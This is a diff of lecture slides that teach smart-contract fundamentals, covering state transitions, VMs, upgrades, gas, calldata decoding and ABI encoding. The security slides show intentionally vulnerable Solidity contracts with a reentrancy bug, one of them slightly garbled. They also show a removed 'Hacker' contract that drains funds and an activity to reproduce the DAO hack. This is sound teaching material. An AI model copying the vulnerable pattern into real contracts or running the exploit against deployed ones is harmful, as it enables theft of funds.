@@ -2,6 +2,7 @@
 title: Smart contracts fundamentals
 description: Introduction to fundamentals smart conctracts concepts
 duration: 30min
+url: http://localhost:1948/syllabus/3-PVM-Polkadot-Architecture-and-Smart-Contracts/2-Smart-Contracts-101-slides.md
 ---
 
 ## Smart contracts fundamentals
@@ -27,11 +28,7 @@ Notes:
 
 ## Smart contracts & blockchain
 
-<section>
-  <pre><code>
-State n  ----->  STF(State n, [Tx1, Tx2, ...])  ----->  State n+1
-  </code></pre>
-</section>
+<img style="width: 90%"  src="img/smart-contracts-101/stf.png" />
 
 Notes:
 
@@ -47,21 +44,7 @@ Since all nodes execute the same transactions with the same rules, they all deri
 
 ### Bitcoin
 
-<section>
-<pre><code>
-State n                                                                     State n + 1
--------                                                                     -----------
-
-                           STF(State n, [
-
-Alice: 2ETH tx1: transfer(1BTC Alice -> BOB), Alice: 1BTC
-Bob: 1BTC ──────▶ tx2: transfer(1BTC Charlie -> BOB), ─────▶ Bob: 3BTC
-Charlie: 2BTC ... Charlie 1BTC
-])
-
-</code></pre>
-
-</section>
+<img style="width: 90%"  src="img/smart-contracts-101/stf-btc.png" />
 
 Notes:
 
@@ -73,20 +56,7 @@ The state transition function, will validate the transactions, and update the st
 
 ### Polkadot
 
-<section>
-<pre><code>
-State n                                                               State n + 1
--------                                                               -----------
-                                     STF(State n, [
-Accounts { Alice: 1DOT, ... }           tx1: transfer(...),           Accounts { <state_n+1 }
-Assets:  { <state_n> }         ─────▶  tx2: stake(...),     ─────▶  Assets:  { <state_n+1> }
-Staking: { <state_n> }                  tx3: vote(...),               Staking: { <state_n+1> }
-OpenGov: { <state_n> }                  ...                           OpenGov: { <state_n+1> }
-...                                   ])                              ...
-
-</code></pre>
-
-</section>
+<img style="width: 90%"  src="img/smart-contracts-101/stf-dot.png" />
 
 Notes:
 
@@ -115,21 +85,7 @@ Otherwise, only predefined transaction types (e.g., assets, governance, staking)
 
 ### Smart contracts chain
 
-<section>
-<pre><code>
-State n                                                                                 State n + 1
--------                                                                                 -----------
-
-Alice: 2ETH STF(State n, [ Alice: 2ETH
-Bob: 1ETH tx1: call(Alice -> Bob, 1ETH), Bob: 1ETH
-... ───▶ tx2: call(Alice -> 0x1, 1ETH, input: 0x1234), ───▶ ...
-SC 0x1: 1ETH { <state_n> } tx3: call(Alice -> 0x2, 0ETH, input: 0x4567), SC 0x1: 1ETH { <state_n+1> }
-SC 0x2: 0ETH { <state_n> } ... SC 0x2: 0ETH { <state_n+1> }
-])
-
-</code></pre>
-
-</section>
+<img style="width: 90%"  src="img/smart-contracts-101/stf-evm.png" />
 
 Notes:
 
@@ -156,52 +112,7 @@ When a user transfers USDC, the contract updates the sender’s balance by subtr
 
 ## Bytecode & Virtual Machines
 
-<pre><code>
-             ┌────────────────┐
-             │      Code      │
-             │(.sol, .rs, ..) │
-             │                │
-             └────────┬───────┘
-                      │
-                      │ Compiler Produces
-                      │ Bytecode, ABI
-           ┌──────────┴─────────────┐
-           │                        │
-           │                        │
-           ▼                        ▼
- ┌───────────────────┐    ┌───────────────────┐
- │                   │    │                   │
- │JSON-RPC           │    │JSON-RPC           │
- │                   │    │                   │
- │Deploy call        │    │Contract Call      │
- │- bytecode         │    │- address          │
- │- ABI encoded input│    │- ABI encoded input│
- │                   │    │                   │
- └───────────────────┘    └───────────────────┘
-┌───────────────────────────────────────────────┐
-│                                               │
-│         Execute                               │
-│                                               │
-│  ┌─────────────────────────────────────────┐  │
-│  │             Virtual Machine             │  │
-│  │                                         │  │
-│  └─────────────────────────────────────────┘  │
-│ ┌──────────────────────────────────────────┐  │
-│ │                                          │  │
-│ │KV Store:                                 │  │
-│ │                                          │  │
-│ │- ...                                     │  │
-│ │                                          │  │
-│ │- address:   0x12345                      │  │
-│ │- nonce:     0                            │  │
-│ │- balance    1ETH                         │  │
-│ │- bytecode   0x...                        │  │
-│ │- key1       value1                       │  │
-│ │- key2       value2                       │  │
-│ │                                          │  │
-│ └──────────────────────────────────────────┘  │
-└───────────────────────────────────────────────┘
-</code></pre>
+<img style="width: 100%; " src="img/smart-contracts-101/bytecode-vm.png" />
 
 Notes:
 
@@ -219,7 +130,7 @@ The state transition function of the blockchain runs the Virtual Machine to exec
 
 ## Core Features of Smart Contracts
 
----h
+---v
 
 ### A simple Example
 
@@ -263,6 +174,8 @@ Developers don’t typically write bytecode by hand. Instead, they write smart c
 
 ### Immutability
 
+<img rounded style="width: 500px"  src="img/smart-contracts-101/Immutability.jpg" />
+
 Notes:
 Contracts are immutable by design, however in some circumstances, you might want to upgrade to fix a bug or add or
 improve existing features. There are several patterns to achieve this, one of the most common is the Proxy pattern.
@@ -274,12 +187,16 @@ When you want to upgrade the contract, you deploy a new implementation contract 
 #### Smart Contract Upgrade
 
 - **Upgradability**: Immutable, unless using proxies
-- Governance Model: Typically managed by a contract owner or DAO governance
-- Process:
+
+  - Governance Model: Typically managed by a contract owner or DAO governance
+
+- **Process**:
+
   - Deploy a new contract implementation
   - Update the proxy contract to point to the new version
   - State Migration if needed
-- Overhead:
+
+- **Overhead**:
   - Gas overhead due to delegate calls and proxy interactions
   - Gas costs for state migration & new contract deployment
 
@@ -288,11 +205,15 @@ When you want to upgrade the contract, you deploy a new implementation contract 
 #### Substrate Runtime Upgrade (Polkadot)
 
 - **Upgradability**: Achieved through a Wasm runtime upgrade
+
 - **Governance Model**: On-chain governance (OpenGov)
-- Process:
+
+- **Process**:
+
   - Proposal submitted through OpenGov
   - Once approved, a runtime upgrade transaction is dispatched, and state is migrated as part of the upgrade
-    Overhead:
+
+- **Overhead**:
   - Gas Costs: No gas cost (upgrade happens at the protocol level)
   - No performance overhead (new runtime code replaces the old one)
 
@@ -300,9 +221,20 @@ When you want to upgrade the contract, you deploy a new implementation contract 
 
 ### Composability
 
+<img rounded style="width: 500px"  src="img/smart-contracts-101/composability.jpg" />
+
 Notes:
 Smart contracts on EVM-based chains are highly composable, meaning they can interact with each other to execute complex workflows. A contract call is always initiated by an Externally Owned Account (EOA) through a transaction.
 
+---v
+
+### Call types
+
+- Normal Call: Contract A calls Contract B
+- Static Call: Contract A reads data from Contract B
+- Delegate Call: Contract A executes Contract B in its execution context
+
+Notes:
 Methods for contract interaction include:
 
 - **Normal Call**:
@@ -328,9 +260,29 @@ to access their functionality, read and write data and execute complex workflows
 on the Aave protocol, where a contract can borrow funds from the protocol, execute a series of transactions and repay
 the loan in the same transaction.
 
+---
+
+### Call types
+
+<img style="height: 90%"  src="img/smart-contracts-101/call-stack-1.png" />
+
+---v
+
+### Call types
+
+<img style="height: 90%"  src="img/smart-contracts-101/call-stack-2.png" />
+
+---v
+
+### Call types
+
+<img style="height: 90%"  src="img/smart-contracts-101/call-stack-3.png" />
+
 ---v
 
 ### Precompiled Contracts
+
+<img rounded style="width: 500px"  src="img/smart-contracts-101/precompiles.jpg" />
 
 Notes:
 
@@ -343,6 +295,8 @@ In Substrate, a Smart-Contract pallet, can leverage this to expose other feature
 ---
 
 ### Gas
+
+<img rounded style="width: 500px"  src="img/smart-contracts-101/gas.jpg" />
 
 Notes:
 
@@ -363,7 +317,6 @@ This system ensures that no contract can consume unlimited resources, execution 
 ---v
 
 ```solidity
-// TODO slide with infinite loop
     while (true) {
         // ...
         // This loop will consume all gas and revert
@@ -376,6 +329,8 @@ This system ensures that no contract can consume unlimited resources, execution 
 #### Metered calls in EVM
 
 <img style="width: 1200px" src="./img/frontier/GasometerDiagram.png" />
+
+Notes:
 
 - Checks before each opcode to make sure gas can be paid
 - Safe: prevents unpaid work from being done
@@ -432,6 +387,8 @@ In Substrate-based chains, execution is handled differently
 
 ## Security
 
+<img rounded style="width: 500px"  src="img/smart-contracts-101/security.jpg" />
+
 Notes:
 
 Permissionless Deployment is Risky
@@ -447,11 +404,24 @@ Even small logic errors or gas inefficiencies can be exploited for financial gai
 
 ---v
 
-### The famous reentrency DAO hack
+### Reentrency bug
 
 ```solidity
+contract Vulnerable {
+    mapping(address => uint256) public balances;
+
+    function withdraw() external {
+        uint256 amount = balanceOf[msg.sender];
+
+        // 🔴 Sends ETH before updating balance
+        (bool success, ) = msg.sender.call.value(amount)("");
+        require(success, "Transfer failed.");
+
+        // 🔴 Balance Update after Transfer - Allows Reentrancy!
+        balances[msg.sender] = 0;
+    }
+}
 contract Dao {
-    // ...
     mapping(address => uint256) public balances;
 
     function deposit() public payable {
@@ -463,43 +433,24 @@ contract Dao {
         uint256 amount = balances[msg.sender];
         require(amount > 0, "No balance to withdraw");
 
-        // 🔴 Sends ETH before updating balance
+        // ❗Sends ETH before updating balance
         (bool success, ) = msg.sender.call{value: amount}("");
         require(success, "Transfer failed");
 
-        // 🔴 Balance Update after Transfer - Allows Reentrancy!
+        // ❗ Balance Update after Transfer - Allows Reentrancy!
         balances[msg.sender] = 0;
-    }
-}
-
-interface IDao {
-    function withdraw() external ;
-    function deposit()external  payable;
- }
-
-contract Hacker{
-    IDao dao;
-
-    constructor(address _dao){
-        dao = IDao(_dao);
-    }
-
-    function attack() public payable {
-        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
-        dao.deposit{value: msg.value}();
-        dao.withdraw();
-    }
-
-    fallback() external payable{
-        if(address(dao).balance >= 1 ether){
-            dao.withdraw();
-        }
     }
 }
 ```
 
 Note:
 see https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/
+
+---v
+
+### Activity: Reproduce the DAO hack
+
+> Reproduce the infamous DAO hack.
 
 ---
 
@@ -544,14 +495,13 @@ The receipt is an important object, used by wallet and JS libraries, it will con
 | `author_submitExtrinsic` | Submits a signed transaction             |
 | `state_call`             | Calls a runtime API exposed by a pallet. |
 
----h
+---v
 
 ### Example sending a raw transaction
 
 ```json
-curl
--H 'content-type: application/json'
-https://westend-asset-hub-eth-rpc.polkadot.io/
+curl https://westend-asset-hub-eth-rpc.polkadot.io \
+-H 'content-type: application/json' \
 -d '{
   "method":"eth_sendRawTransaction",
   "params" ["0x02f8b3018313c1..."],
@@ -566,7 +516,7 @@ https://westend-asset-hub-eth-rpc.polkadot.io/
 
 ```sh
 # https://etherscan.io/getRawTx?tx=0xcd58fbee0f90c4b7136a5af85876090dd1593e4580f840bcf0a7b9219772a5d4
-❯ cast decode-tx 0x02f8b3018313c1748387841585746a528800830249f094a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4880b844a9059cbb000000000000000000000000ba04f1c1e4577165dd2297d3fbedf956b0e4c8a70000000000000000000000000000000000000000000000000000000004cc7c30c080a0c330502a046982553df56842433dfb1f318c980724bfd30be53e6461cea620aca025217d80ae9538009b3b24ab83fdac6df67982b433f74488d2c14fee41ca2d79
+> cast decode-tx 0x02f8b3018313c17...
 {
   "type": "0x2",
   "chainId": "0x1",
@@ -576,7 +526,7 @@ https://westend-asset-hub-eth-rpc.polkadot.io/
   "maxPriorityFeePerGas": "0x878415",
   "to": "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
   "value": "0x0",
-  "input": "0xa9059cbb000000000000000000000000ba04f1c1e4577165dd2297d3fbedf956b0e4c8a70000000000000000000000000000000000000000000000000000000004cc7c30",
+  "input": "0x..."
   "r": "0xc330502a046982553df56842433dfb1f318c980724bfd30be53e6461cea620ac",
   "s": "0x25217d80ae9538009b3b24ab83fdac6df67982b433f74488d2c14fee41ca2d79",
   "yParity": "0x0",
@@ -607,19 +557,7 @@ You will notice that the transaction does not have a 'from' field, this is becau
 ```sh
 INPUT="0xa9059cbb000000000000000000000000ba04f1c1e4577165dd2297d3fbedf956b0e4c8a70000000000000000000000000000000000000000000000000000000004cc7c30"
 
-# Get the first 4 bytes (8 characters after '0x')
-FIRST_4_BYTES="0x${INPUT:2:8}"
-
-# Get the function signature using https://openchain.xyz/signatures
-cast 4byte $FIRST_4_BYTES
-transfer(address,uint256)
-
-# Decode the input data using the function signature
-ALL_BUT_FIRST_4_BYTES=${INPUT:10}
-cast abi-decode -i "transfer(address,uint256)" $ALL_BUT_FIRST_4_BYTES
-```
-
-```sh
+cast decode-calldata "transfer(address,uint256)" $INPUT
 0xBA04f1c1E4577165dD2297D3FbEdF956B0e4C8a7
 80510000 [8.051e7]
 ```
@@ -635,12 +573,34 @@ Now that we have decoded the transaction, we can try to decode the input data
 ### Encoding ABI parameters
 
 ```sh
-cast abi-encode "test((bool, string, address))" "(true, hello, 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)" | xxd -r -p | xxd -c 32
-
+cast calldata \
+"test((bool, string, address))" \
+"(true, hello, 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)" \
+| xxd -r -p | xxd -c 32
 ```
 
 ```hexdump
+00000000: f8f3 4990 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ..I.............................
+00000020: 0000 0020 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ... ............................
+00000040: 0000 0001 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ................................
+00000060: 0000 0060 0000 0000 0000 0000 0000 0000 a0b8 6991 c621 8b36 c1d1 9d4a 2e9e b0ce  ...`..............i..!.6...J....
+00000080: 3606 eb48 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  6..H............................
+000000a0: 0000 0005 6865 6c6c 6f00 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000  ....hello.......................
+000000c0: 0000 0000
+```
 
+---v
+
+### Encoding ABI parameters
+
+```sh
+cast abi-encode \
+"test((bool, string, address))" \
+"(true, hello, 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48)" \
+| xxd -r -p | xxd -c 32
+```
+
+```hexdump
 00000000: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0020  ...............................
 00000020: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0001  ................................
 00000040: 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0060  ...............................`
@@ -650,11 +610,9 @@ cast abi-encode "test((bool, string, address))" "(true, hello, 0xa0b86991c6218b3
 ```
 
 Notes:
-
 We’ve covered decoding ABI-encoded data—now let’s look at the opposite process: encoding function call parameters.
 Using the function's ABI signature, we can encode the parameters using cast abi-encode.
-
-A few key things to note:
+A few remarks:
 
 - We are encoding a tuple containing a boolean, a string, and an address.
 - Since a tuple is dynamic, the first 32 bytes store an offset to where the actual data starts—here, 0x20.
@@ -662,6 +620,8 @@ A few key things to note:
 - The string is another dynamic type, so instead of being stored inline, its offset (0x60) is stored at 0x40.
 - The address is a fixed-size type, so it’s stored inline immediately after the offsets.
 - At offset 0x60, we find the length of the string, and right after that, the string content itself.
+
+---
 
 ## Smart Contract Ecosystem
 
